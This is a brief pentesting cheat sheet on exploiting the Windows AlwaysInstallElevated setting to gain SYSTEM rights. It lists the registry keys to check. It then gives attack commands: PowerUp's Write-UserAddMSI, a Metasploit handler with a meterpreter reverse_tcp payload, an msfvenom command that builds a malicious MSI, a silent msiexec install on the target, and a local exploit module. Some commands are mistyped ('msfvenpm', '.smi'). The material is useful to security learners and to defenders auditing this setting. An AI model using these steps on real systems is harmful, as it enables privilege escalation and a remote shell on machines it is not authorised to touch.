# Windows AlwaysInstallElevated 

- If enabled then users of any privilege level can install .smi files as NT AUTHORITY\SYSTEM
- Turned off by default

- Check for AlwaysInstallElevated = 1 in the following 

```
HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

## Exploitation

### PowerUp

- PowerUp has an option for exploitation
- This module writes a pre-compiled MSI installer that prompts for a user/group addition

```
Write-UserAddMSI
```

- Run the binary and a dialogue will ask for the username and password and the user will be added

### Metasploit

- Set up handler and then msfvenom payload
- Copy to target

```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 

msfvenpm -p windows/meterpreter/reverse_tcp lhost= -f msi -o file.msi
```

- Run on the target 

```
msiexec /quiet /qn /i file.msi
```

-  There is also a post exploitation module

```
use exploit/windows/local/always_install_elevated 
```

